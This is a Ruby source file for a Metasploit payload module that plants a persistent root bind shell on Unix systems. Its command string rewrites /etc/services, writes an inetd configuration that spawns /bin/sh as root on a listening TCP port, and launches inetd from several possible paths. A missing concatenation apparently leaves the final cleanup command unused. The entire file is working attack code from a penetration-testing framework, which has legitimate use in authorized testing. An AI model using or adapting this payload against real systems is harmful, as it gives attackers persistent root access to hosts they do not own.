require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Cmd
module Unix

module BindInetd

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Bind TCP (inetd)',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell (persistent)',
			'Author'        => 'hdm',
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string
		tmp = "/tmp/.msf_inetd" + $$.to_s
		cmd =
			# Create a clean copy of the services file
			"grep -v msfbind /etc/services>#{tmp};" +
			
			# Add our service to it
			"echo msfbind #{datastore['LPORT']}/tcp>>#{tmp};" +
			
			# Overwrite the services file with our new version
			"cp #{tmp} /etc/services;" +
			
			# Create our inetd configuration file with our service
			"echo msfbind stream tcp nowait root /bin/sh sh>#{tmp};" +
			
			# First we try executing inetd without the full path
			"inetd -s #{tmp} ||" +
			
			# Next try the standard inetd path on Linux, Solaris, BSD
			"/usr/sbin/inetd -s #{tmp} ||" +
			
			# Next try the Irix inetd path
			"/usr/etc/inetd -s #{tmp};"

			# Delete our configuration file
			"rm #{tmp};";

		return cmd
	end

end

end end end end end
